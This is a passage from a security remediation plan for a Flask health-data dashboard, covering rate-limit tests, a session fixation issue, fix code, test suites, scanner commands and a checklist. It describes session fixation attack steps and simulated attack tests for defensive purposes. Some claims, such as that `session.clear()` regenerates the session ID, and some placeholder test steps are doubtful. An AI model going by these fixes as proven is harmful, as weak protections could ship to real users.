        response = client.get('/v2/bundle/dashboard', headers=auth_headers)
        assert response.status_code == 200

    # Next request should be rate limited
    response = client.get('/v2/bundle/dashboard', headers=auth_headers)
    assert response.status_code == 429
    assert b'Too many requests' in response.data

def test_dashboard_detail_rate_limit(client, auth_headers):
    """Verify detail endpoint enforces rate limit."""
    # Make requests up to limit
    for i in range(200):
        response = client.get('/v2/bundle/dashboard/test-id', headers=auth_headers)
        # May be 404 if bundle doesn't exist, but not 429
        assert response.status_code in (200, 404)

    # Next request should be rate limited
    response = client.get('/v2/bundle/dashboard/test-id', headers=auth_headers)
    assert response.status_code == 429

def test_api_endpoint_stricter_rate_limit(client):
    """Verify unauthenticated API has stricter limits."""
    # Make requests up to limit (50 for API vs 100 for dashboard)
    for i in range(50):
        response = client.get('/v2/bundle/test-id')
        assert response.status_code in (200, 404)

    # Next request should be rate limited
    response = client.get('/v2/bundle/test-id')
    assert response.status_code == 429

def test_rate_limit_headers_present(client, auth_headers):
    """Verify rate limit headers are sent."""
    response = client.get('/v2/bundle/dashboard', headers=auth_headers)

    assert 'X-RateLimit-Limit' in response.headers
    assert 'X-RateLimit-Remaining' in response.headers
    assert 'X-RateLimit-Reset' in response.headers

def test_rate_limit_per_user_not_per_ip(client, auth_session_1, auth_session_2):
    """Verify rate limits are per-user, not per-IP."""
    # User 1 exhausts their limit
    for i in range(100):
        response = client.get('/v2/bundle/dashboard', headers=auth_session_1)
        assert response.status_code == 200

    # User 1 is rate limited
    response = client.get('/v2/bundle/dashboard', headers=auth_session_1)
    assert response.status_code == 429

    # User 2 can still make requests (different user ID)
    response = client.get('/v2/bundle/dashboard', headers=auth_session_2)
    assert response.status_code == 200
```

**Load Testing:**
```python
# locustfile.py
from locust import HttpUser, task, between

class DashboardUser(HttpUser):
    wait_time = between(1, 3)

    def on_start(self):
        # Login
        self.client.get('/v2/auth/login')

    @task(3)
    def search_bundles(self):
        self.client.get('/v2/bundle/dashboard')

    @task(1)
    def view_bundle_detail(self):
        self.client.get('/v2/bundle/dashboard/test-bundle-id')
```

Run: `locust --host=http://localhost:5000`

### Files to Modify

1. **MODIFY:** `app/fhir/routes.py` - Add rate limiting decorators
2. **MODIFY:** `app/extensions.py` - Update limiter configuration
3. **MODIFY:** `app/app.py` - Add rate limit error handler
4. **MODIFY:** `app/settings.py` - Add rate limit configuration
5. **MODIFY:** `.env.example` - Add rate limit settings
6. **NEW:** `app/metrics.py` - Rate limit monitoring (if doesn't exist)
7. **NEW:** `tests/test_rate_limiting.py` - Rate limit tests
8. **NEW:** `locustfile.py` - Load testing script

### Verification Steps

1. Run tests: `flask test tests/test_rate_limiting.py`
2. Manual testing:
   - Make 100 search requests rapidly
   - Verify 101st request returns 429
   - Wait 1 minute, verify requests work again
   - Check rate limit headers in response
3. Load testing:
   - Run locust with 10 concurrent users
   - Verify rate limits are enforced
   - Monitor Redis for rate limit keys
4. Production monitoring:
   - Set up alerts for rate limit exceeded events
   - Monitor DataDog for `rate_limit.exceeded` metric
   - Review logs for abuse patterns

### References

- [OWASP API Security: Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [Flask-Limiter Documentation](https://flask-limiter.readthedocs.io/)
- [RFC 6585: Additional HTTP Status Codes (429)](https://tools.ietf.org/html/rfc6585#section-4)
- [IETF Draft: RateLimit Header Fields](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-ratelimit-headers)

---

## Issue 8: Session Fixation Vulnerability

### Severity: HIGH ⚠️

**OWASP:** A01:2025 Broken Access Control
**CWE:** CWE-384 (Session Fixation)

### Vulnerability Description

The session ID is not regenerated after successful authentication, allowing session fixation attacks where an attacker can hijack a user's session by forcing them to use a known session ID.

### Affected Code

**File:** `app/auth_routes.py`
**Lines:** 127-131
**Function:** `callback()`

```python
# Session is populated but not regenerated
session['user'] = {
    'id': userinfo.get('sub') or userinfo.get('user_id') or 'unknown',
    'email': userinfo.get('email', 'unknown@example.com'),
    'name': userinfo.get('name') or userinfo.get('username', 'Unknown User'),
    'roles': list(account_roles),
}
```

### Attack Vectors

Example 1: Session Fixation Attack

```text
1. Attacker gets session ID: SESS123
2. Attacker tricks victim into using SESS123 (via link or XSS)
3. Victim authenticates with SESS123
4. Attacker uses SESS123 to access victim's account
```

Example 2: Session Donation

```text
1. Attacker authenticates and gets session
2. Attacker donates session to victim
3. Victim's actions are attributed to attacker
```

### Root Cause

Flask sessions are not regenerated after privilege escalation (authentication). The same session ID used before authentication continues after authentication, allowing fixation attacks.

### Feasibility Analysis

**Complexity:** Low
**Breaking Changes:** None
**Dependencies:** None (Flask built-in)

**Challenges:**

1. Need to preserve `next_url` during regeneration
2. Must clear old session completely
3. Should set session as permanent after auth

### Implementation Plan

Step 1: Regenerate Session After Authentication

Modify: `app/auth_routes.py` in `callback()` function

```python
@auth_bp.route('/callback')
@limiter.limit('20 per minute')
def callback():
    """Handle OAuth callback."""
    try:
        token = oauth.unite_us.authorize_access_token()

        # Extract user info from token response
        userinfo = token.get('userinfo', {})

        # If no userinfo, authentication fails
        if not userinfo or not userinfo.get('sub'):
            current_app.logger.error('OAuth token response missing userinfo')
            raise Unauthorized('Authentication failed: missing user information')

        # Fetch account roles from Core API
        account_roles = _fetch_account_roles(token.get('access_token'), userinfo.get('sub'))

        # Fail closed if role fetch failed
        if account_roles is None:
            current_app.logger.error('Unable to verify permissions - role fetch failed')
            return render_template(
                'error.html',
                error_message='Unable to verify your permissions. Please try again.',
                error_code=503
            ), 503

        # Check if user has required role
        if not DASHBOARD_ALLOWED_ROLES.intersection(account_roles):
            current_app.logger.warning(
                f'User {hash_identifier(userinfo.get("email"), "email")} '
                f'attempted dashboard access without required role. '
                f'User roles: {account_roles}, Required: {DASHBOARD_ALLOWED_ROLES}'
            )
            return render_template(
                'forbidden.html',
                error_message='You do not have permission to access this resource.'
            ), 403

        # SECURITY: Preserve next_url before clearing session
        next_url = session.pop('next_url', None)

        # SECURITY: Regenerate session ID to prevent session fixation
        # Clear old session completely
        session.clear()

        # Mark session as permanent (uses PERMANENT_SESSION_LIFETIME)
        session.permanent = True

        # Populate new session with user data
        session['user'] = {
            'id': userinfo.get('sub') or userinfo.get('user_id') or 'unknown',
            'email': userinfo.get('email', 'unknown@example.com'),
            'name': userinfo.get('name') or userinfo.get('username', 'Unknown User'),
            'roles': list(account_roles),
        }

        # Add session metadata for security monitoring
        session['authenticated_at'] = datetime.now(timezone.utc).isoformat()
        session['ip_address'] = request.remote_addr

        current_app.logger.info(
            f'User {hash_identifier(userinfo.get("email"), "email")} logged in successfully'
        )

        # Validate redirect URL before redirecting
        if next_url and is_safe_redirect_url(next_url):
            return redirect(next_url)
        else:
            if next_url:
                current_app.logger.warning(f'Unsafe redirect URL rejected: {next_url}')
            return redirect(url_for('fhir.bundle_dashboard_search'))

    except Forbidden:
        raise
    except Exception as e:
        current_app.logger.error(f'OAuth callback error: {e}', exc_info=True)
        raise Unauthorized('Authentication failed')
```

Step 2: Add Session Security Middleware

Create new file: `app/session_security.py`

```python
"""Session security middleware."""
from datetime import datetime, timezone
from flask import current_app, g, request, session


def validate_session_security():
    """Validate session security attributes.

    Checks for:
    - IP address changes (potential session hijacking)
    - Session age (enforce timeout)
    - Required session attributes

    Returns:
        bool: True if session is valid, False otherwise
    """
    if 'user' not in session:
        return True  # Not authenticated, nothing to validate

    # Check IP address consistency (optional, can be disabled for mobile users)
    if current_app.config.get('SESSION_VALIDATE_IP', False):
        session_ip = session.get('ip_address')
        current_ip = request.remote_addr

        if session_ip and session_ip != current_ip:
            current_app.logger.warning(
                f'Session IP mismatch: session={session_ip}, current={current_ip}'
            )
            return False

    # Check session age
    authenticated_at = session.get('authenticated_at')
    if authenticated_at:
        try:
            auth_time = datetime.fromisoformat(authenticated_at)
            age = (datetime.now(timezone.utc) - auth_time).total_seconds()
            max_age = current_app.config['PERMANENT_SESSION_LIFETIME'].total_seconds()

            if age > max_age:
                current_app.logger.info('Session expired due to age')
                return False
        except (ValueError, TypeError) as e:
            current_app.logger.error(f'Invalid authenticated_at timestamp: {e}')
            return False

    return True


def init_session_security(app):
    """Initialize session security middleware.

    Args:
        app: Flask application instance
    """
    @app.before_request
    def check_session_security():
        """Validate session security before each request."""
        if not validate_session_security():
            # Clear invalid session
            session.clear()
            g.session_invalidated = True

            # Redirect to login for dashboard routes
            if request.path.startswith('/v2/bundle/dashboard'):
                from flask import redirect, url_for
                return redirect(url_for('auth.login'))
```

Step 3: Initialize Session Security

Modify: `app/app.py`

```python
# Add import
from app.session_security import init_session_security

# In create_app() or main initialization
init_session_security(app)
```

Step 4: Add Session Configuration

Modify: `app/settings.py`

```python
class Config:
    # ... existing config ...

    # Session Security
    SESSION_VALIDATE_IP = os.getenv('SESSION_VALIDATE_IP', 'False').lower() == 'true'
    SESSION_COOKIE_NAME = 'screenings_session'  # Custom name (security through obscurity)
```

Modify: `.env.example`

```bash
# Session Security
# Validate IP address consistency (disable for mobile users)
SESSION_VALIDATE_IP=False
```

Step 5: Add Session Regeneration on Privilege Change

If you add admin features later, regenerate session when privileges change:

```python
def elevate_user_privileges(user_id, new_roles):
    """Elevate user privileges and regenerate session.

    Args:
        user_id: User ID to elevate
        new_roles: New roles to assign
    """
    # Preserve user data
    user_data = session.get('user', {})

    # Regenerate session
    session.clear()
    session.permanent = True

    # Update with new roles
    user_data['roles'] = new_roles
    user_data['privilege_elevated_at'] = datetime.now(timezone.utc).isoformat()
    session['user'] = user_data

    current_app.logger.info(
        f'User {hash_identifier(user_id, "user")} privileges elevated'
    )
```

### Testing Requirements

**Unit Tests:**

```python
# tests/auth/test_session_fixation.py
def test_session_regenerated_after_login(client):
    """Verify session ID changes after authentication."""
    # Get initial session
    response = client.get('/v2/bundle/dashboard')
    initial_cookie = response.headers.get('Set-Cookie')

    # Extract session ID
    import re
    initial_session = re.search(r'screenings_session=([^;]+)', initial_cookie)
    initial_session_id = initial_session.group(1) if initial_session else None

    # Authenticate
    # ... perform OAuth flow ...

    # Get session after auth
    response = client.get('/v2/bundle/dashboard')
    final_cookie = response.headers.get('Set-Cookie')
    final_session = re.search(r'screenings_session=([^;]+)', final_cookie)
    final_session_id = final_session.group(1) if final_session else None

    # Session ID should be different
    assert initial_session_id != final_session_id

def test_session_marked_permanent_after_auth(client, auth_flow):
    """Verify session is marked as permanent after authentication."""
    # Authenticate
    auth_flow.complete()

    # Check session
    with client.session_transaction() as sess:
        assert sess.permanent is True
        assert 'authenticated_at' in sess
        assert 'ip_address' in sess

def test_old_session_invalid_after_regeneration(client, auth_flow):
    """Verify old session ID cannot be used after regeneration."""
    # Get initial session
    with client.session_transaction() as sess:
        old_session_data = dict(sess)

    # Authenticate (regenerates session)
    auth_flow.complete()

    # Try to use old session data
    with client.session_transaction() as sess:
        sess.clear()
        sess.update(old_session_data)

    # Should not be authenticated
    response = client.get('/v2/bundle/dashboard')
    assert response.status_code == 302  # Redirect to login

def test_session_invalidated_on_ip_change(app, client, auth_flow):
    """Verify session invalidated when IP changes (if enabled)."""
    app.config['SESSION_VALIDATE_IP'] = True

    # Authenticate from IP 1
    auth_flow.complete()

    # Access from different IP
    with client:
        client.environ_base['REMOTE_ADDR'] = '192.168.1.100'
        response = client.get('/v2/bundle/dashboard')

        # Should be redirected to login
        assert response.status_code == 302
        assert '/v2/auth/login' in response.location
```

**Security Tests:**

```python
# tests/auth/test_session_security.py
def test_session_fixation_attack_prevented(client):
    """Verify session fixation attack is prevented."""
    # Attacker gets a session
    response = client.get('/v2/bundle/dashboard')
    attacker_session = extract_session_cookie(response)

    # Victim authenticates with attacker's session
    client.set_cookie('localhost', 'screenings_session', attacker_session)
    # ... complete OAuth flow ...

    # Attacker tries to use original session
    client.set_cookie('localhost', 'screenings_session', attacker_session)
    response = client.get('/v2/bundle/dashboard')

    # Should not be authenticated (session was regenerated)
    assert response.status_code == 302  # Redirect to login
```

### Files to Modify

1. **MODIFY:** `app/auth_routes.py` - Regenerate session in callback
2. **NEW:** `app/session_security.py` - Session validation middleware
3. **MODIFY:** `app/app.py` - Initialize session security
4. **MODIFY:** `app/settings.py` - Add session security config
5. **MODIFY:** `.env.example` - Add session settings
6. **NEW:** `tests/auth/test_session_fixation.py` - Session fixation tests
7. **NEW:** `tests/auth/test_session_security.py` - Session security tests

### Verification Steps

1. Run tests: `flask test tests/auth/test_session_fixation.py tests/auth/test_session_security.py`
2. Manual testing:
   - Login and note session cookie
   - Verify session cookie changes after login
   - Try using old session cookie (should fail)
   - Verify session expires after timeout
3. Security testing:
   - Attempt session fixation attack
   - Test session hijacking scenarios
   - Verify IP validation (if enabled)
4. Browser testing:
   - Test with multiple browsers
   - Test with incognito mode
   - Verify logout clears session

### References

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [Flask Session Documentation](https://flask.palletsprojects.com/en/latest/api/#sessions)
- [NIST SP 800-63B: Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

---

## Testing Strategy

### Test Organization

```text
tests/
├── auth/
│   ├── test_csrf.py                    # CSRF protection tests
│   ├── test_session_fixation.py        # Session fixation tests
│   ├── test_session_security.py        # Session validation tests
│   └── test_auth_logging.py            # PII logging tests
├── fhir/
│   ├── test_validators.py              # Input validation unit tests
│   ├── test_search_security.py         # SQL injection tests
│   ├── test_search_validation.py       # Search parameter validation
│   ├── test_dashboard_xss.py           # XSS prevention tests
│   └── test_bundle_endpoint.py         # Existing bundle tests
├── test_security_headers.py            # Security headers tests
├── test_rate_limiting.py               # Rate limiting tests
└── test_logging_utils.py               # Logging utility tests
```

### Test Fixtures

Create shared fixtures for authentication testing:

**File:** `tests/conftest.py`

```python
"""Shared test fixtures."""
import pytest
from flask import session


@pytest.fixture
def auth_headers(client):
    """Create authenticated session for testing.

    Returns:
        dict: Headers with authentication
    """
    with client.session_transaction() as sess:
        sess['user'] = {
            'id': 'test-user-123',
            'email': 'test@example.com',
            'name': 'Test User',
            'roles': ['hq_user']
        }
        sess.permanent = True

    return {}


@pytest.fixture
def admin_headers(client):
    """Create admin session for testing.

    Returns:
        dict: Headers with admin authentication
    """
    with client.session_transaction() as sess:
        sess['user'] = {
            'id': 'admin-user-123',
            'email': 'admin@example.com',
            'name': 'Admin User',
            'roles': ['hq_admin']
        }
        sess.permanent = True

    return {}


@pytest.fixture
def extract_csrf_token():
    """Helper to extract CSRF token from response.

    Returns:
        function: Function to extract token from HTML
    """
    def _extract(html_content):
        import re
        match = re.search(r'name="csrf_token" value="([^"]+)"', html_content.decode())
        return match.group(1) if match else None

    return _extract
```

### Integration Test Suite

Run all security tests together:

```bash
# Run all security tests
flask test tests/auth/ tests/fhir/test_*security*.py tests/test_security_headers.py tests/test_rate_limiting.py

# Run with coverage
flask test --coverage tests/auth/ tests/fhir/

# Run specific security issue tests
flask test tests/fhir/test_search_security.py  # Issue 1: SQL Injection
flask test tests/auth/test_csrf.py             # Issue 2: CSRF
flask test tests/fhir/test_dashboard_xss.py    # Issue 3: XSS
flask test tests/test_security_headers.py      # Issue 4: Headers
flask test tests/fhir/test_validators.py       # Issue 5: Validation
flask test tests/test_logging_utils.py         # Issue 6: PII Logging
flask test tests/test_rate_limiting.py         # Issue 7: Rate Limiting
flask test tests/auth/test_session_fixation.py # Issue 8: Session Fixation
```

### Manual Testing Checklist

**Pre-Deployment Security Checklist:**

- [ ] SQL Injection
  - [ ] Test with special characters in search
  - [ ] Test with regex patterns
  - [ ] Test with SQL injection attempts
  - [ ] Verify no database errors in logs

- [ ] CSRF Protection
  - [ ] Verify CSRF tokens in all forms
  - [ ] Test logout requires POST
  - [ ] Test API endpoints exempt from CSRF
  - [ ] Attempt CSRF attack from external page

- [ ] XSS Prevention
  - [ ] Test with malicious bundle IDs
  - [ ] Verify no inline event handlers
  - [ ] Test JavaScript execution attempts
  - [ ] Check browser console for errors

- [ ] Security Headers
  - [ ] Verify headers with curl/browser DevTools
  - [ ] Test CSP doesn't block legitimate resources
  - [ ] Test iframe embedding blocked
  - [ ] Run securityheaders.com scan

- [ ] Input Validation
  - [ ] Test oversized inputs
  - [ ] Test invalid enum values
  - [ ] Test invalid dates
  - [ ] Test SQL wildcards
  - [ ] Verify user-friendly error messages

- [ ] PII Logging
  - [ ] Search logs for email addresses
  - [ ] Verify hashed identifiers present
  - [ ] Test log correlation by hash
  - [ ] Review with compliance team

- [ ] Rate Limiting
  - [ ] Test rate limits on all endpoints
  - [ ] Verify rate limit headers
  - [ ] Test per-user vs per-IP limiting
  - [ ] Monitor rate limit metrics

- [ ] Session Security
  - [ ] Verify session regeneration after login
  - [ ] Test session timeout
  - [ ] Test session fixation attack
  - [ ] Verify logout clears session

### Performance Testing

Test that security fixes don't degrade performance:

```bash
# Load test with locust
locust --host=http://localhost:5000 --users=50 --spawn-rate=10

# Monitor metrics
# - Response times should be < 500ms for dashboard
# - Rate limiting should not impact legitimate users
# - Database query performance unchanged
```

### Security Scanning

Run automated security scanners:

```bash
# OWASP ZAP scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:5000/v2/bundle/dashboard

# Bandit (Python security linter)
pipenv run bandit -r app/

# Safety (dependency vulnerability scanner)
pipenv check
```

---

## Security Best Practices References

### OWASP Resources

1. **[OWASP Top 10 2025](https://owasp.org/www-project-top-ten/)**
   - A01:2025 Broken Access Control
   - A02:2025 Security Misconfiguration
   - A03:2025 Injection
   - A04:2025 Insecure Design

2. **[OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)**
   - API1:2023 Broken Object Level Authorization
   - API4:2023 Unrestricted Resource Consumption
   - API8:2023 Security Misconfiguration

3. **[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)**
   - [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
   - [Cross-Site Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
   - [Cross-Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
   - [Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
   - [Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
   - [Logging](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

4. **[OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)**

### CWE (Common Weakness Enumeration)

- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-770: Allocation of Resources Without Limits](https://cwe.mitre.org/data/definitions/770.html)

### Framework-Specific Documentation

1. **Flask Security**
   - [Flask Security Considerations](https://flask.palletsprojects.com/en/latest/security/)
   - [Flask Session Documentation](https://flask.palletsprojects.com/en/latest/api/#sessions)
   - [Jinja2 Autoescaping](https://jinja.palletsprojects.com/en/3.1.x/templates/#html-escaping)

2. **Flask Extensions**
   - [Flask-WTF CSRF Protection](https://flask-wtf.readthedocs.io/en/stable/csrf.html)
   - [Flask-Limiter Documentation](https://flask-limiter.readthedocs.io/)
   - [Authlib OAuth Documentation](https://docs.authlib.org/en/latest/client/flask.html)

3. **SQLAlchemy Security**
   - [SQLAlchemy SQL Injection Protection](https://docs.sqlalchemy.org/en/20/faq/sqlexpressions.html#how-do-i-render-sql-expressions-as-strings-possibly-with-bound-parameters-inlined)
   - [PostgreSQL Security](https://www.postgresql.org/docs/current/sql-syntax.html)

### Standards and Compliance

1. **NIST Guidelines**
   - [NIST SP 800-63B: Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)
   - [NIST SP 800-122: Guide to Protecting PII](https://csrc.nist.gov/publications/detail/sp/800-122/final)

2. **Privacy Regulations**
   - [GDPR Article 32: Security of Processing](https://gdpr-info.eu/art-32-gdpr/)
   - [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/index.html)
   - [CCPA: California Consumer Privacy Act](https://oag.ca.gov/privacy/ccpa)

3. **Web Standards**
   - [RFC 6585: Additional HTTP Status Codes](https://tools.ietf.org/html/rfc6585)
   - [RFC 6749: OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
   - [RFC 7636: PKCE for OAuth Public Clients](https://tools.ietf.org/html/rfc7636)

### Security Tools

1. **Testing Tools**
   - [OWASP ZAP](https://www.zaproxy.org/) - Web application security scanner
   - [Bandit](https://bandit.readthedocs.io/) - Python security linter
   - [Safety](https://pyup.io/safety/) - Dependency vulnerability scanner
   - [Locust](https://locust.io/) - Load testing tool

2. **Online Scanners**
   - [Security Headers](https://securityheaders.com/) - HTTP security header scanner
   - [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Content Security Policy validator
   - [SSL Labs](https://www.ssllabs.com/ssltest/) - SSL/TLS configuration tester

3. **Browser Tools**
   - Chrome DevTools Security Panel
   - Firefox Developer Tools
   - Browser extensions for security testing

### Learning Resources

1. **OWASP Training**
   - [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Interactive security training
   - [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) - Vulnerable web application for practice

2. **Books**
   - "The Web Application Hacker's Handbook" by Dafydd Stuttard
   - "Flask Web Development" by Miguel Grinberg (Security chapter)

3. **Online Courses**
   - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
   - [OWASP Top 10 Training](https://owasp.org/www-project-top-ten/)

---

## Implementation Checklist

### Phase 1: Critical Issues (Block Merge)

- [ ] **Issue 1: SQL Injection**
  - [ ] Create `app/fhir/validators.py`
  - [ ] Update `app/fhir/service.py`
  - [ ] Update `app/fhir/routes.py`
  - [ ] Write unit tests
  - [ ] Write integration tests
  - [ ] Manual testing
  - [ ] Code review

- [ ] **Issue 2: CSRF Protection**
  - [ ] Add Flask-WTF to Pipfile
  - [ ] Update `app/extensions.py`
  - [ ] Update `app/app.py`
  - [ ] Update `app/settings.py`
  - [ ] Update `app/auth_routes.py`
  - [ ] Update all templates
  - [ ] Write tests
  - [ ] Manual testing
  - [ ] Code review

- [ ] **Issue 3: XSS Prevention**
  - [ ] Update `app/fhir/templates/search.html`
  - [ ] Update `app/fhir/templates/base.html`
  - [ ] Write tests
  - [ ] Manual testing
  - [ ] Browser testing
  - [ ] Code review

### Phase 2: High Priority Issues (Block Deployment)

- [ ] **Issue 4: Security Headers**
  - [ ] Update `app/app.py`
  - [ ] Update `app/settings.py`
  - [ ] Create `app/static/css/dashboard.css` (optional)
  - [ ] Update templates (optional)
  - [ ] Write tests
  - [ ] Run securityheaders.com scan
  - [ ] Code review

- [ ] **Issue 5: Input Validation**
  - [ ] Enhance `app/fhir/validators.py`
  - [ ] Update `app/fhir/routes.py`
  - [ ] Update templates with HTML5 validation
  - [ ] Write tests
  - [ ] Manual testing
  - [ ] Code review

- [ ] **Issue 6: PII Logging**
  - [ ] Create `app/logging_utils.py`
  - [ ] Update `app/auth_routes.py`
  - [ ] Update `app/settings.py`
  - [ ] Create `docs/logging-policy.md`
  - [ ] Write tests
  - [ ] Log audit
  - [ ] Compliance review

- [ ] **Issue 7: Rate Limiting**
  - [ ] Update `app/fhir/routes.py`
  - [ ] Update `app/extensions.py`
  - [ ] Update `app/app.py`
  - [ ] Update `app/settings.py`
  - [ ] Create/update `app/metrics.py`
  - [ ] Write tests
  - [ ] Load testing
  - [ ] Code review

- [ ] **Issue 8: Session Fixation**
  - [ ] Update `app/auth_routes.py`
  - [ ] Create `app/session_security.py`
  - [ ] Update `app/app.py`
  - [ ] Update `app/settings.py`
  - [ ] Write tests
  - [ ] Security testing
  - [ ] Code review

### Phase 3: Final Verification

- [ ] Run full test suite
- [ ] Run security scanners (ZAP, Bandit, Safety)
- [ ] Load testing with Locust
- [ ] Manual security testing
- [ ] Code review by second engineer
- [ ] Update documentation
- [ ] Security sign-off

---

## Summary

This implementation plan addresses 8 security vulnerabilities (3 CRITICAL, 5 HIGH) introduced by the OAuth authentication and bundle dashboard features. All issues are feasible to fix with low to medium complexity and minimal breaking changes.

**Total Scope:**
- **New Files:** 10
- **Modified Files:** 15+
- **Test Files:** 10+
- **Dependencies:** Flask-WTF (new)

**Implementation Order:**
1. Critical issues first (SQL injection, CSRF, XSS)
2. High priority issues second (headers, validation, PII, rate limiting, session fixation)
3. Testing and verification throughout

**Success Criteria:**
- All tests passing
- Security scanners show no critical/high issues
- Manual security testing successful
- Code review approved
- Documentation updated

This plan provides sufficient detail for a future agent or developer to implement all fixes without additional research or clarification.
